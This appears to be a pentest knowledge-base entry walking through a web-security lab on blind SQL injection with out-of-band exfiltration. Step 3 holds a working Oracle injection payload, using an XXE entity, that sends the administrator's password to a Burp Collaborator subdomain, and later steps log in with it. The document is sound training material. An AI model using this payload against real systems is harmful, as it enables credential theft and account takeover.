---
id: e42ac8f4-cac7-4cf3-82df-c5ad5f68f927
name: Blind SQL Out Of Band Data Exfiltration
type: procedure
verified: true
submitted: true
created_at: '2020-08-18T14:59:11.505897+00:00'
updated_at: '2023-05-26T01:34:08.855471+00:00'
platforms:
- Web
tags:
- '[[blind SQL]]'
- '[[data exfiltration]]'
- '[[Web Applications]]'
---

# Blind SQL Out Of Band Data Exfiltration

**Status**: ✓ Verified

## Summary

An attacker will craft a sql query and get it executed asynchronously and no response is shown in the application's page. 

## Description

# Description

An attacker will craft a sql query and get it executed asynchronously and no response is shown in the application's page.

# Instructions



1. Navigate to the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.







![12d9e2ac-db15-4d0e-bdc1-cb40dc3a021e.png]()





2.Send this to repeater and start a burp collaborator client .



Note : Burp Collaborator is available only on Burp Suite Professional.







![6142f441-600b-4197-9742-52b9baa93333.png]()





3.Modify the `TrackingId`cookie, changing it to something like the following:



*`TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual*—`





*`note : Replace with your collaborator ur*l`



![12d28299-4f2f-4fa2-ad57-cc69decd9c4e.png]()





4.Go back to the Burp Collaborator client window, and click "Poll now". The password of the `administrator` user should appear in the subdomain of the interaction





![693b176a-f744-461a-8948-a32dc71208f9.png]()





5.Go to the "Account login" function of the lab, and use the password to log in as the administrator user





![5aafbe0c-542e-424f-af45-0f6a21869f69.png]()



## Platforms

- Web

## Tags

- [[blind SQL]]
- [[data exfiltration]]
- [[Web Applications]]


